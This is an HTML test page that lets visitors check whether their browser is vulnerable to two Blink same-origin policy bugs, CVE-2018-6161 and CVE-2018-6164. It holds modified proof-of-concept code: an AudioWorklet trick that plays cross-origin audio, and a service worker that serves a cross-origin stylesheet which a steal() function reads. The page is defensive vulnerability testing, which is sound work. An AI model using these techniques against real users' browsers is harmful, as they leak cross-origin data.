<html>
<head>
  <title>SOP Tests</title>
</head>

<body>
<h1>Same-origin policy tests</h1>
<p><i>Check whether your browser is vulnerable to any of these SOP CVEs found in Blink!</i></p>

<h2>1. Modified POC for <a href="https://nvd.nist.gov/vuln/detail/CVE-2018-6161">CVE-2018-6161</a></h2>
<div>
<p>Check whether your browser allows for audio to be played even if it is cross-origin!<p>
<p>Try to play the audio below. Then, click on any of the buttons to change the audio source. Try to play the audio again.</p>
</div>
<br>
<div>
<audio id="leftAudio" controls>
  <source id="source" src="/location.php?url=https://www.w3schools.com/tags/horse.mp3" type="audio/mpeg">
</audio>
<br>
<p>first button: <button onclick="document.getElementById('leftAudio').src='https://www.w3schools.com/tags/horse.mp3'">Change source to https://www.w3schools.com/tags/horse.mp3</button></p>
<p>second button: <button onclick="document.getElementById('leftAudio').src='/location.php?url=https://www.w3schools.com/tags/horse.mp3'">Change source to /location.php?url=https://www.w3schools.com/tags/horse.mp3</button></p>
</div>
<br>
<div>
<i class="fa">&#128077; Good: Your browser does not play any sounds no matter which source you change to.</i>
<br>
<i class="fa">&#128078; Bad: Your browser neighs after you click on the second button.</i>
</div>
<br>

<script>
var audioCtx = new (window.AudioContext || window.webkitAudioContext)();
var myAudio = document.getElementById("leftAudio");

// Create a MediaElementAudioSourceNode
// Feed the HTMLMediaElement into it
var source = audioCtx.createMediaElementSource(myAudio);

audioCtx.audioWorklet.addModule('audi-work.js').then(() => {

  // After the resolution of module loading, an AudioWorkletNode can be
  // constructed.
  let gainWorkletNode = new AudioWorkletNode(audioCtx, 'gain-processor');

  // AudioWorkletNode can be interoperable with other native AudioNodes.
  source.connect(gainWorkletNode).connect(audioCtx.destination);
});
</script>

<h2>2. Modified POC for <a href="https://nvd.nist.gov/vuln/detail/CVE-2018-6164">CVE-2018-6164</a></h2>
<div>
<p>Check whether your browser allows for css content to be readable even if it is cross-origin!<p>
</div>
<button onclick="style.display='none'; steal()">Try to read a cross-origin style</button>
<br>
<br>

<div>
<i class="fa">&#128077; Good: You do not see any alerts.</i>
<br>
<i class="fa">&#128078; Bad: You see an alert containing cross-origin css!</i>
</div>
<br>

<link rel="stylesheet" href="/catchme">
<script>
  navigator.serviceWorker.register('/dysw.js?cors=no-cors&match=catchme&url=https://another-origin.firebaseapp.com/cross-origin.css')
  .then(reg => {
      // registration worked
      console.log('Registration succeeded. Scope is ' + reg.scope);
    }).catch(function(error) {
      // registration failed
      console.log('Registration failed with ' + error);
  });

  function steal() {
    alert(document.styleSheets[0].cssRules[0].cssText);
  }
</script>
